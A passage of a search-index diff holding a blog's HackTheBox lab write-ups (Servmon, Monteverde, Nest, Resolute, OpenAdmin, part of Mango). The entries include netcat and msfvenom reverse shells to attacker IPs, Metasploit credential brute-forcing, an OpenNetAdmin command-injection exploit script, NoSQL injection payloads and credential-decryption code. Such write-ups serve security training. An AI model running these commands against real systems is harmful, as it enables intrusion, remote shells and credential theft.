log Flag root: Book machine is compromise. Trophy:  There is no friend as loyal as a book.  Ernest Hemingway "
+    }, {
+    "id": 22,
+    "url": "/posts/HTB-09-Pentest-Servmon/",
+    "title": "Write-up Servmon Machine",
+    "body": "2020/06/20 - Ref°: HTB-09-Machine — Servmon is a Windows machine that highlights an unsecured FTP server that will allow you to obtain important information about two users. Using a traversal directory from NVMS-1000 will allow us to retrieve a txt file (result of informations found above) showing several passwords in clear text. Privilege Escalation on NSClient++ allow to obtain root privilege from our compromise user.  [1] Discovery - Figure out environment: Check all services: We find interesting services ftp, web on their usual ports and one custom port. $ nmap -A -T5 10. 10. 10. 184 -p- FTP on port 21: Anonymous FTP login is allowed.  This access on the FTP give us the possibility to check two user folders Nadine and Nathan.  Two notes are presents : Nadine note : Nathan note : Websites on port 80 and 8443: Port 80 : We have login page of NVMS-1000 service.  Directory Traversal is possible on NVMS-1000. Reference : https://www. exploit-db. com/exploits/48311 Port 8443 : We have another service, named NSClient++. But the page seem to be break … Privilege Escalation is possible on NSClient++ 0. 5. 2. 35 : https://www. exploit-db. com/exploits/46802 The Nadine note reference about a file named Passwords. txt present on the Desktop of Nathan user. We use the first vulnerabilitie on NVMS-1000 to grab this file and gained the foothold. [2] Foothold - Get into the target : Directory Traversal: Let’s start metasploit to use the exploit module.  $ msfconsolemsf5 &gt; search nvmsmsf5 &gt; use auxiliary/scanner/http/tvt_nvms_traversalmsf5 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS 10. 10. 10. 184msf5 auxiliary(scanner/smb/smb_login) &gt; set FILEPATH 'Users\Nathan\Desktop\Passwords. txt'msf5 auxiliary(scanner/smb/smb_login) &gt; exploitWe reveal much password in the file : 1nsp3ctTh3Way2Mars!, Th3r34r3To0M4nyTrait0r5!, B3WithM30r4ga1n5tMe, L1k3B1gBut7s@W0rk, 0nly7h3y0unGWi11F0l10w, IfH3s4b0Utg0t0H1sH0me, Gr4etN3w5w17hMySk1Pa5$ Let’s see now if one of there match with Nadine or Nathan user. $ msfconsolemsf5 &gt; search smb_loginmsf5 &gt; use auxiliary/scanner/smb/smb_loginmsf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE . . . /Usernames. txtmsf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE . . . /Passwords. txtmsf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10. 10. 10. 184msf5 auxiliary(scanner/smb/smb_login) &gt; exploit Remote Service WinRM login: We get the flag to validate our foothold.  [3] Privilege Escalation - Gain higher-level permissions: NSClient++ 0. 5. 2. 35 Exploitation: When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator’s password in cleartext from the configuration file. From here a user is able to login to the web server and make changes to the configuration file that is normally restricted. Plaintext Password in configuration file: From configuration file c:\program files\nsclient++\nsclient. ini we obtained the password : ew2x6SsGTxjRwXOT But we also note that the administration page is accessible only in localhost. I tried to add my IP, but it requires a reboot. And we’re also having display problems accessing the service. We need to fix all that to operate properly. Chromium :: To fix the display issue, i use Chromium and not firefox. $ chromium --no-sandbox --user-data-dir=~/. config/chromiumSSH Local Forwarding: To bypass the localhost restriction, we use the local forwarding to forward a port from Servmon machine to my attacking machine. Reference - ssh tunneling : https://www. ssh. com/ssh/tunneling/example $ ssh -l nadine 10. 10. 10. 184 -L 1234:127. 0. 0. 1:8443We have now access on https://127. 0. 0. 1:1234 and the possibility to exploit Servmon machine.  Check requirement modules :: Two modules are correctly enabled.  Put evil script and nc tool :: From c:\temp we add our script. NC tool is also in place. $ copy con servmon. bat@echo offc:\Temp\nc. exe 10. 10. 14. 89 443 -e cmd. exeSetup listener on attacking machine :: $ sudo nc -lnvp 443Run Arbitrary command through API: All action with API. Web interface is so break … We add our script : $ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/servmon. bat --data-binary  c:\Temp\nc. exe 10. 10. 14. 89 443 -e cmd. exe $ curl -s -k -u admin https://localhost:8443/api/v1/scripts/ext/scripts/servmon. bat And we launch the script : Flag root: We obtain root privilege : Trophy:  Monitoring is not protection.  Myself "
+    }, {
+    "id": 23,
+    "url": "/posts/HTB-08-Pentest-Monteverde/",
+    "title": "Write-up Monteverde Machine",
+    "body": "2020/06/13 - Ref°: HTB-08-Machine — Monteverde is a Windows machine that highlights the weakness of a password (lazy password) after a first enumeration and the presence of a password in the SMB service to get our flag user. A privilege escalation is possible when our user is in Azure Admins security group to perform an attack through AD Azure Connect service to get flag root.  [1] Discovery - Figure out environment: Check all services: We find interesting services dns, kerberos, ldap and smb on their usual ports. $ nmap -A -T5 10. 10. 10. 172 -p-Enumerate Samba service from enum4linux: Enum4linux is a tool for enumerating information from Windows and Samba systems. We find users : Administrator, Guest, AAD_987d7f2f57d2, mhope, SABatchJobs, svc-ata, svc-bexec, svc-netapp, dgalanos, roleary, smorgan And interesting group Azure Admins with 3 members. $ enum4linux 10. 10. 10. 172user:[Guest] rid:[0x1f5]user:[AAD_987d7f2f57d2] rid:[0x450]user:[mhope] rid:[0x641]user:[SABatchJobs] rid:[0xa2a]user:[svc-ata] rid:[0xa2b]user:[svc-bexec] rid:[0xa2c]user:[svc-netapp] rid:[0xa2d]user:[dgalanos] rid:[0xa35]user:[roleary] rid:[0xa36]user:[smorgan] rid:[0xa37]. . . . . . . Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AdministratorGroup 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope[2] Foothold - Get into the target : Using Lazy Password: We have much possitiblity to exploit Active-Directory Machine. Reference - Active-Directory exploit toolbox : https://github. com/infosecn1nja/AD-Attack-Defense/blob/master/README. md But longer enumeration and kerberos attack give me nothing. In this situation we’re gonna try lazy passwords. Let’s see with smb_login module in Metasploit and set true the USER_AS_PASS. $ msfconsolemsf5 &gt; search smb_loginmsf5 &gt; use auxiliary/scanner/smb/smb_loginmsf5 auxiliary(scanner/smb/smb_login) &gt; set SMBDomain MEGABANK. LOCALmsf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE /root/Documents/writeups/monteverde/userfile. txtmsf5 auxiliary(scanner/smb/smb_login) &gt; set USER_AS_PASS truemsf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10. 10. 10. 172msf5 auxiliary(scanner/smb/smb_login) &gt; exploitResult : Success: 'megabank. local\SABatchJobs:SABatchJobs' [3] Lateral Movement - Move through environment: Plaintext Password from conf file: We enum with SABatchJobs on smb service. $ smbmap -u SABatchJobs -p SABatchJobs -H 10. 10. 10. 172$ mount -t cifs //10. 10. 10. 172/users$ share_users -o username=SABatchJobs,password=SABatchJobsWe find file in user folder azure. xml with a plaintext password : 4n0therD4y@n0th3r$This xml seems to be created by azure cmdlet to create password for the user mhope with -AsPlainText attribut.  Remote Service WinRM login: We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985). WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. Reference - evil-winrm tool : https://github. com/Hackplayers/evil-winrm $ evil-winrm -i 10. 10. 10. 172 -u mhope -p '4n0therD4y@n0th3r$'Flag user: We flag the user to validate the compromission of the system user. Result the flag : 4961976bd7d8f4eeb2ce3705e2f212f2 [4] Privilege Escalation - Gain higher-level permissions: Azure ADConnect Database exploitation: We identified an interesting group at the beginning Azure Admins. Here our user Mhope belongs to this group : Global Group Memberships Azure Admins PS c:\Users\mhope\Documents&gt; net users mhopeAfter research to find any exploit through group Azure Admins, i finally found the exploitation to compromise Monteverde Machine through the database of Azure ADConnect Service. Reference - exploit : https://blog. xpnsec. com/azuread-connect-for-redteam/ Azure AD Connect is the service installed within the Active Directory environment. It is responsible for syncing and communicating with Azure AD and is what the majority of this post will focus on. From mhope user we have the ability to extract credential of the account (with the necessary right to perform DCSync Attack) which served during the installation of Azure AD Connect through the decryption of the value encrypted_configuration in the database ADSync. To do this we use the script of a hackthebox player made available on github : https://github. com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect. ps1 This script is based on the POC created by XPN but with a modification in the ArgumentList to pass when we execute it. The script then becomes more flexibility. The decrypted password for the account which served during the installation of Azure AD Connect will be revealed : d0m@in4dminyeah! PS C:\Users\mhope\Documents&gt; menuPS C:\Users\mhope\Documents&gt; Azure-ADConnect -server 10. 10. 10. 172 -db ADSYNCResult :[+] Domain: MEGABANK. LOCAL[+] Username: administrator[+]Password: d0m@in4dminyeah! Remote Service WinRM login: Here the account is administrator, so we dont need to perform DCSync Attack. We can connect with evil winrm and grab the flag root to valide the compromission of the mahine. $ evil-winrm -i 10. 10. 10. 172 -u Administrator -p 'd0m@in4dminyeah!'Flag root: Result : 12909612d25c8dcf6e5a07d1a804a0bc Trophy:  They might call it the cloud but it is, in fact, just someone else’s computer.  Mark Russinovich "
+    }, {
+    "id": 24,
+    "url": "/posts/HTB-07-Pentest-Nest/",
+    "title": "Write-up Nest Machine",
+    "body": "2020/06/06 - Ref°: HTB-07-Machine — Nest is a Windows machine which highlights the risks of an insecure file system through available and exploitable shares. Review Code on two programs found in the SMB service, allows to decrypt the hash of a user and the administrator. The hash of the administrator being visible in a legacy service (HQK) using the debug password that was hidden in a file via ADS.  [1] Discovery - Figure out environment: Check all services: Nmap scan reveal smb service on her usual port and an other port assigned by a unknow service. $ nmap -Pn -T5 10. 10. 10. 178 -p- Smb: This service reveal many shares visible without authentication : ADMIN$, C$, Data, IPC$, Secure$, Users $ smblcient -L 10. 10. 10. 178 HQK: Telnet connection on port 4386, reveals service named HQK Reporting Service V1. 2. $ telnet 10. 10. 10. 178 4386 Vulnerabilities: No vulnerabilities identify here, but we have possibility to mount and enum shares in anonymous mode. We can exploit this to access and gain a foothold. The connection to the HQK service is not protected by authentication. But at this point we don’t have enough information to know how to exploit this path. [2] Foothold - Get into the target : Unsecured File Sharing: We have two shares that give access to the machine and gain foothold : Data, Users. We switch to Windows to access these two shares and we enumerate to perform a lateral movement.  Plaintext Password from email: We find temporary credentials below \\10. 10. 10. 178\Data\Shared\Templates\HR\Welcome Email. text Remote Service SMB login: This temporary user give us more elements from smb service. smbmap command show us the possibility to access an a other share : SECURE$ $ smbmap -u TempUser -p welcome2019 -H 10. 10. 10. 178 [3] Lateral Movement - Move through environment: Hashed Password from . xml file: We mount this share on our Windows machine with net use command. $ net use LETTER: \\10. 10. 10. 178\SHARES /user:TempUser welcome2019We find configuration file with hash password of user C. Smith below \\10. 10. 10. 178\Data\IT\Config\RU Scanner\RU_config. xml This file seem to be associated of program named RU Scanner.  Reviewing Code of RU-Scanner Program: NotepadPlusPlus. xml file make reference to a subfolder in SECURE$ share at line 99 : Carl In this subfolder, we find Visual Studio project named RUScanner under \VB Project\WIP\RU\. We can find something interesting in this program to potentially decrypt hash ? After reviewing the program with Visual Studio, we can find two interesting functions in the utils. vb object : EncryptString, DecryptString.  First, let’s look at the encryption function that encrypted the password of the user C. Smith and result the hash found above. Public Shared Function EncryptString(PlainString As String) As StringIf String. IsNullOrEmpty(PlainString) Then    Return String. EmptyElse    Return Encrypt(PlainString,  N3st22 ,  88552299 , 2,  464R5DFA5DL6LE28 , 256)  End IfEnd FunctionWhat we learn here is that to encrypt a string, we use the following :  passPhrase = N3st22 saltValue = 88552299 passwordIterations = 2 initVector = 464R5DFA5DL6LE28 keySize = 256So we have the possiblity to decrypt the hash from function DecryptString. Public Shared Function DecryptString(EncryptedString As String) As StringIf String. IsNullOrEmpty(EncryptedString) Then    Return String. EmptyElse    Return Decrypt(EncryptedString,  N3st22 ,  88552299 , 2,  464R5DFA5DL6LE28 , 256)  End IfEnd FunctionDecrypting Password: We create a new vb project and insert only the functions we need. Reference - my vb program : https://github. com/PCW3R/Tools-Programs/tree/master/Decrypt-Nest-Rfc2898DeriveBytes Utils. vb : Imports System. TextImports System. Security. CryptographyPublic Class Utils  Public Shared Function GetLogFilePath() As String    Return IO. Path. Combine(Environment. CurrentDirectory,  Log. txt )  End Function  Public Shared Function DecryptString(EncryptedString As String) As String    If String. IsNullOrEmpty(EncryptedString) Then      Return String. Empty    Else      Return Decrypt(EncryptedString,  N3st22 ,  88552299 , 2,  464R5DFA5DL6LE28 , 256)    End If  End Function  Public Shared Function Decrypt(ByVal cipherText As String,                  ByVal passPhrase As String,                  ByVal saltValue As String,                  ByVal passwordIterations As Integer,                  ByVal initVector As String,                  ByVal keySize As Integer) _              As String    Dim initVectorBytes As Byte()    initVectorBytes = Encoding. ASCII. GetBytes(initVector)    Dim saltValueBytes As Byte()    saltValueBytes = Encoding. ASCII. GetBytes(saltValue)    Dim cipherTextBytes As Byte()    cipherTextBytes = Convert. FromBase64String(cipherText)    Dim password As New Rfc2898DeriveBytes(passPhrase,                      saltValueBytes,                      passwordIterations)    Dim keyBytes As Byte()    keyBytes = password. GetBytes(CInt(keySize / 8))    Dim symmetricKey As New AesCryptoServiceProvider    symmetricKey. Mode = CipherMode. CBC    Dim decryptor As ICryptoTransform    decryptor = symmetricKey. CreateDecryptor(keyBytes, initVectorBytes)    Dim memoryStream As IO. MemoryStream    memoryStream = New IO. MemoryStream(cipherTextBytes)    Dim cryptoStream As CryptoStream    cryptoStream = New CryptoStream(memoryStream,                    decryptor,                    CryptoStreamMode. Read)    Dim plainTextBytes As Byte()    ReDim plainTextBytes(cipherTextBytes. Length)    Dim decryptedByteCount As Integer    decryptedByteCount = cryptoStream. Read(plainTextBytes,                        0,                        plainTextBytes. Length)    memoryStream. Close()    cryptoStream. Close()    Dim plainText As String    plainText = Encoding. ASCII. GetString(plainTextBytes,                      0,                      decryptedByteCount)    Return plainText  End FunctionEnd ClassProgram. vb : We pass the hash value like EncryptedString and call the function DecryptString to result in console the password in plaintext of the user C. Smith. Imports SystemModule Program Sub Main(args As String())    Console. WriteLine(Utils. DecryptString(EncryptedString:= fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= )) End SubEnd ModuleThe password is decrypted : xRxRxPANCAK3SxRxRx Flag user: And we flag the user. $ net use LETTER: \\10. 10. 10. 178\USERS /user:C. Smith xRxRxPANCAK3SxRxRx [4] Privilege Escalation - Gain higher-level permissions: Enumeration under C. Smith account: We enum under C. Smith account on SMB service and find several things :  Program HqkLdap. exe can be find under \\10. 10. 10. 178\USERS\C. Smith\HQK Reporting\AD Integration Module\  A configuration file of the service HQK can be find under \\10. 10. 10. 178\USERS\C. Smith\HQK Reporting\HQK_Config_Backup. xml with a reference to port 4386  And empty file can be find under \\10. 10. 10. 178\USERS\C. Smith\HQK Reporting\Debug Mode Password. txt with reference to DEBUG Password of the service HQKDebug Mode Password: The HQK service is accessible without authentication but it is useless in this context. To go further and find other interesting elements to raise our privileges, we need to find the Debug Mode Password of the service. The file Debug Mode Password. txt seem to be empty on the face of it. But in reality the file hide data through ADS. Reference - ADS tool : https://docs. microsoft. com/en-us/sysinternals/downloads/streams ADS or Alternate Data Stream is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file. ADS have been given a bad reputation because their capability to hide data from us on our own computer, has been abused by malware writers in the past. Here we use ADS to hide the debug password : WBQ201953D8w Reference - ADS method : https://www. asafety. fr/administration-reseaux-et-systemes/les-ads-de-windows-pour-camoufler-vos-fichiers-dans-des-fichiers/ dir /RDebug Mode Password. txt:Password:$DATAmore &lt;  Debug Mode Password. txt :Password Hashed Password through HQK: We use the Debug Password and find the hash password of the Administrator in Ldap. conf. $ telnet 10. 10. 10. 178 4386&gt; DEBUG WBQ201953D8w&gt; SETDIR . . &gt; SETDIR ldap&gt; SHOWQUERY 2 We have the hash and we’re going to proceed in the same way to decrypt it. But we need to know the good values of passPhrase / saltvalue / passwordIterations / initVector and keySize. Reviewing Code HqkLdap. exe: We decompile the program HqkLdap. exe with ILSpy tool and find the correct values. Reference - ILSpy tool : https://github. com/icsharpcode/ILSpy  passPhrase = 667912 saltValue = 1313Rf99 passwordIterations = 3 initVector = 1L1SA61493DRV53Z keySize = 256 Decrypting Password: We replace this values in our program : ElseReturn Decrypt(EncryptedString,  passPhrase ,  saltValue ,  passwordIterations ,  initvector ,  keySize )End IfAnd pass the hash value to decrypt the password : XtH4nkS4Pl4y1nGX Imports SystemModule Program Sub Main(args As String())    Console. WriteLine(Utils. DecryptString(EncryptedString:= yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= )) End SubEnd Module We get full control of Nest machine. Flag root: $ net use LETTER: \\10. 10. 10. 178\C$ /user:Administrator XtH4nkS4Pl4y1nGX Trophy:  Look up at the stars and not down at your feet.  Stephen Hawking "
+    }, {
+    "id": 25,
+    "url": "/posts/HTB-06-Pentest-Resolute/",
+    "title": "Write-up Resolute Machine",
+    "body": "2020/05/30 - Ref°: HTB-06-Machine — Resolute is a Windows machine that highlights the danger of default passwords that have not been changed and the recovery of an overly verbose powershell session record. A privilege escalation is possible with DNSAdmin group. We abuse of membership ryan to gain Administrator right through the possitiblity to inject a malicious DLL in the config of DNS.  [1] Discovery - Figure out environment: Check all services: We find interesting services ; dns, kerberos, ldap and smb on their usual ports. $ nmap -A -T5 10. 10. 10. 169 -p- enum4linux: Enum4linux is a tool for enumerating information from Windows and Samba systems. We find many users : Administrator, Guest, krbtgt, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki And one (marko) with password in description : Welcome123! $ enum4linux 10. 10. 10. 169 Vulnerabilities: We have much possitiblity to exploit Active-Directory Machine. Reference - Active-Directory exploit toolbox : https://github. com/infosecn1nja/AD-Attack-Defense/blob/master/README. md Here we have password appear in description of user and are going to exploit it. But the password doesnt match with the user associated (marko). In this situation we can think about a default password on the creation of user. [2] Foothold - Get into the target : Using Lazy Password: We can test default password on all users found above through smb_login module present in Metasploit. $ msfconsolemsf5 &gt; search smb_loginmsf5 &gt; use auxiliary/scanner/smb/smb_loginmsf5 auxiliary(scanner/smb/smb_login) &gt; set SMBPass Welcome123!msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE /root/Documents/writeups/resolute/userfile. txtmsf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10. 10. 10. 169msf5 auxiliary(scanner/smb/smb_login) &gt; exploitWe result the user who always uses the default password. Success: 'MEGABANK. LOCAL\melanie:Welcome123!'We can connect now with evil-winrm tool and flag the user to validate the compromission of the system user. evil-winrm can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985). WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. Reference - evil-winrm tool : https://github. com/Hackplayers/evil-winrm [3] Lateral Movement - Move through environment: Plaintext Password from transcript Powershell: We enum with Melanie account to find interesting user and success a lateral movement. Hidden folder named PSTranscripts is present under c:\ We keep going down into it to find a Transcript Powershell.  This file is the result of record part of a PowerShell session seem realized by Ryan user. We watching his password in a powershell command : Serv3r4Admin4cc123 Again we can now connect on the user ryan with evil-winrm tool. $ ruby evil-winrm. rb -i 10. 10. 10. 169 -u ryan -p 'Serv3r4Admin4cc123!'[4] Privilege Escalation - Gain higher-level permissions: DNSAdmin - ACLs abuse: Our user is member of DNSAdmin group. We can abuse his membership to escalate to Administrator rights and compromise the Active Directory domain through the loading of malicious DLL (payload reverse shell TCP) with SYSTEM privileges. Reference - exploit DNSADMIN : https://medium. com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 PS c:\Users\ryan\Documents&gt; whoami /groups 1 - Creation of Malicious DLL: We create our malicious DLL with msfvenom by integrating a reverse shell TCP pointing to my IP address of my attacking machine and port 443. $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10. 10. 114. 159 LPORT=443 -f dll &gt; pwndnsadmin. dll 2 - Share Malicious DLL: We share our DLL from impact-server on our attacking machine. If we put manually the DLL through evil-winrm, he is delete directly. Maybe AV detect the payload ? So we bypass it to share from smbserver method. $ sudo impacket-smbserver share /home/pcw3r/Documents/writeups/htb/resolute/3 - Injection of Malicious DLL: We inject our malicious DLL as config for DNS. PS c:\Users\ryan\Documents&gt; dnscmd. exe /config /serverlevelplugindll \\10. 10. 14. 159\share\pwndnsadmin. dll We confirm the adding of the value in regedit. PS c:\Users\ryan\Documents&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name serverlevelplugindll 4 - Attacking machine listening: We listening on port 443 with netcat pending the execution of the payload. $ sudo nc -lnvp 4435 - Execution of payload: dns . exe run under SYTEM privilege. The payload will execute when the service dns restart. This service run under SYSTEM privilege so we will dispose of this right through our attacking machine’s listening port 443. PS c:\Users\ryan\Documents&gt; sc. exe stop dnsPS c:\Users\ryan\Documents&gt; sc. exe start dns We get full control of Resolute machine. Flag root: Trophy:  When you get really smart people together, who are super motivated by the problem that they’re working on, I think people will figure out the answers.  Katie Bouman "
+    }, {
+    "id": 26,
+    "url": "/posts/HTB-05-Pentest-Openadmin/",
+    "title": "Write-up OpenAdmin Machine",
+    "body": "2020/04/20 - Ref°: HTB-05-Machine — Openadmin is a Linux machine that highlights the exploitation of RCE through OpenNetAdmin version 18. 1. 1 to gain a foothold. Lateral movement with enumeration to find clear password in opennetadmin database. Again Lateral movement on 2nd user through vhost wich execute in local the read of her private ssh key. After crack it with john, we get Flag user. Sudo misconfiguration is present for the second user Joanna. Wich allow the execution of nano command under root permission without password. That to get Flag root.  [1] Discovery - Figure out environment: Check all services: The nmap scan reveals SSH and Apache to be running on their usual ports. $ nmap -A -T5 10. 10. 10. 171 -p- Web: We discover folders named artwork and music under http://10. 10. 10. 171 $ dirb http://10. 10. 10. 171 Artwork site : Nothing interesting here.  Music site : We have redirection on other service through login button, wich is OpenNetAdmin.  OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. We have version 18. 1. 1 of the software. Reference - OpenNetAdmin Software : https://opennetadmin. com/ We have finish our first level of enumeration to find our target. Now we need to find any vulnerabilities to exploit it and gain a foothold. Vulnerabilities: Here our target is OpenNetAdmin software. We check all vulnerabilities with searchsploit and we find 2 vulnerabilities presents in our version 18. 1. 1. $ searchsploit opennetadmin We use Remote Code Execution to gain our first level access on the target. Reviewing Code: Reference - exploit RCE : https://www. exploit-db. com/exploits/47691 AJAX arguments allow exploits a command injection in OpenNetAdmin. The vulnerability exists on the tooltips. inc. php component, due to the insecure usage of the shell_exec() PHP function. The execution of the RCE dont need to be authenticated or have an authenticated user. #!/bin/bashURL= ${1} while true;do echo -n  $  ; read cmd curl --silent -d  xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \ BEGIN\ ;${cmd};echo \ END\ &amp;xajaxargs[]=ping   ${URL}  | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1done[2] Foothold - Get into the target : Obtaining Reverse Shell from RCE Execution: Be careful, sometime script retrieve from searchsploit database dont work correctly. To remediate this, copy all code in new file. $ searchsploit -m 47691. sh$ sudo bash 47691. sh http://10. 10. 10. 171/ona/ The exploitation is successful and we have gained a foothold. [3] Lateral Movement - Move through environment: Plaintext Password from database: Enum with www-data account and check the file /etc/passwd to find all system users : Jimmy and Joanna After reading information on the installation of OpenNetAdmin : https://github. com/opennetadmin/ona/wiki/Install We know that the admin or user password of the software is referenced in her database configuration file : /var/www/ona/local/config/database_settings. inc. php We find the database credentials n1nj4W4rri0R! We can test ssh connection with this password and one of the both user finding below. This password is reused by the user system Jimmy.  Reading id_rsa: We continue to enum www folder and we find interesting folder internal. This folder is manage only by our user. Let’s check in to find anything. We find 3 php files : index. php, logout. php and main. php We have the possibility to read the ssh private key of our 2nd user (Joanna) with the php function shell_exec through the page main. php . . . $output = shell_exec('cat /home/joanna/id_rsa');. . . It makes sense to look vhost and see if we matching with our folder internal. We find vhost assign to Joanna on port 52846 below /etc/apache2/sites-enabled/internal. conf VirtualHost 127. 0. 0. 1:52846. . . DocumentRoot /var/www/internalSo we have now everything we need to grab the private key of our 2nd system user. $ curl 127. 0. 0. 1/52846/main. php Cracking Password: We retrieve the private key to exploit it with JohnTheRipper on our attacking machine. Reference - johntheripper tool : https://bytesoverbombs. io/cracking-everything-with-john-the-ripper-d434f0f6dc1c $ sudo python2 ssh2john. py sshprivkey_joanna &gt; joanna. hash$ sudo john --wordlist=/usr/share/wordlists/rockyou. txt joanna. hash We crack the password of the user Joanna : bloodninjas Fix the warning on the unprotected ssh key file and connect on with ssh to grab the flag user. Reference - fix warning unprotected private key : https://www. howtogeek. com/168119/fixing-warning-unprotected-private-key-file-on-linux $ sudo chmod 600 sshprivkey_joanna We flag the user to validate the compromission of the system users.  [4] Privilege Escalation - Gain higher-level permissions: Sudo Misconfiguration: $ sudo -lUser Joanna may run the following commands with no password (ALL) NOPASSWD: /bin/nano /opt/priv We run this command to gain root access on the server : $ sudo /bin/nano /opt/privWe have opening of one blank page under root permission. At this moment we can do everything.  And we flag the root account to validate the compromission of the system. Go to read file with key combination ^R.  Insert the file we want to read.  Flag root: We grab our flag root value ! Trophy:  It’s never too late to start.  Me, Myself and I "
+    }, {
+    "id": 27,
+    "url": "/posts/HTB-04-Pentest-Mango/",
+    "title": "Write-up Mango Machine",
+    "body": "2020/04/18 - Ref°: HTB-04-Machine — Mango is a Linux machine that highlights web enumeration through a certificate and NoSQL injection on unsecure login page, to discover credentials in MongoDB database with Blind method. That to get User Flag. SGID file is present under Admin user and allow to run jjs under root permission. We use GTFOBin on this unix binaries to read our root. txt and get Root Flag.  [1] Discovery - Figure out environment: Check all services: The nmap scan reveals SSH and Apache to be running on their usual ports; 22, 80 and 443. $ nmap -A -T5 10. 10. 10. 162 -p- Web: Port 80 : We have no permission to access of this ressource from the ip address.  Port 443 : We have a webpage search / analytics.  And certificate alert. Let’s check this and find something interesting.  This certificate is delivery for CN staging-order. mango. htb. Let’s change our hosts file to see what the answer is behind are.  Nothing on the port 443, but we have now a unsecure login page appear on port 80.  We use Burp Suite to see how login and password are injects in the form.  username=admin&amp;password=test&amp;login=loginAfter many research, we have a NoSQL Database behind (MongoDB = Mango ?).  Vulnerabilities: Here our target is MongoDB. This database structure is vulnerable of many injections like authentication bypass or blindnosql. Reference - all injection with mongo : https://nullsweep. com/a-nosql-injection-primer-with-mongo/ [2] Foothold - Get into the target : Bypassing Authentication with NoSQL Injection: We bypass the login page to see if we have something interesting. Reference - toolbox NoSql Injection : https://github. com/swisskyrepo/PayloadsAllTheThings/ We inject during the interception with Burp a not equal [$ne] in the username and password. username[$ne]=admin&amp;password[$ne]=test&amp;login=login After disabled the interception, we bypass the authentication and we are redirected to a new page home. php. This page is interesting because we know now our first user –&gt; admin@mango. htb But that’s not enough to gain our first level access on the target. Blind NoSQL exploitation: This type of database still vulnerable of other injection method like blind NoSQL which give the possibility to find any information in the database. In order to do this we proceed by brute-force, and more precisely by efficient brute-force. Reference - blind sql injection : https://zestedesavoir. com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-en-aveugle/blind-sql-injection/ What is this technique ? “This injection is a bit of a guessing game: the person you are asking can only answer yes or no. It would therefore require a certain number of questions before finding the information you want, unlike a “classic” query that would return the result directly. ” What is the difference between efficient and pure brute-force ? “The pure brute-force is to test all combinations by asking if it is equal to, the efficient brute-force is to ask if the searched string begins with or if the ne letter is: we don’t test the whole set but a part of it, which considerably reduces the number of queries to perform. ” I found a script to brute-force a usernames and passwords values through this technique. References - script :  https://github. com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration https://book. hacktricks. xyz/pentesting-web/nosql-injectionWe can see how work the efficient brute-force : $ python nosqli-user-pass-enum. py -u http://staging-order. mango. htb/index. php -up username -pp password -ep username -op login:login $ python nosqli-user-pass-enum. py -u http://staging-order. mango. htb/index. php -up username -pp password -ep password -op login:login We have 2 users 2 passwords, and 1 service ssh not yet exploited. To avoid the testing one by one, i create a user and password files to test it in metasploit with ssh_login module. $ msfconsolemsf5 &gt; use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhost 10. 10. 10. 162msf5 auxiliary(scanner/ssh/ssh_login) &gt; set user_file /[. . . ]/users. txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set user_file /[. . . ]/passwords. txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit And we can connect now from ssh : The exploitation is successful and we have gained a foothold with the credential mango / h3mXK8RhU~f{]f5H We flag the user to validate the compromission of the system user. [3] Lateral Movement - Move through environment: Local SU login: The second user (found above : admin / t9KcS3&gt;!0B#2) is not allowed to connect to ssh, but like Postman Machine we can connect with command su. $ mango@mango:~$ su admin [4] Privilege Escalation - Gain higher-level permissions: GTFOBins abuse: We enum with LinPEAS tool on Admin account to find anything to escalate our privilege. Reference - linPEAS tool : https://github. com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS We transfert the tool on the machine.  And we find interesting SGID files like /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs We can find the same thing with Linenum tool.  This command need to be execute under Admin user. And after some research, the jjs is present in GTFOBin database. So we can exploit it. We have much possibility with this unix binaries. We can read, write, push reverse shell, get shell, etc. under root permission. But we’re not gonna execute them all. We’re just going to read our root. txt and shadow file to see. Reference - jjs GTFOBin : https://gtfobins. github. io/gtfobins/jjs/ We use the code to read file root. txt. So to realize this, we replace file_to_read by root/root. txt and grab the flag value ! echo 'var BufferedReader = Java. type( java. io. BufferedReader );var FileReader = Java. 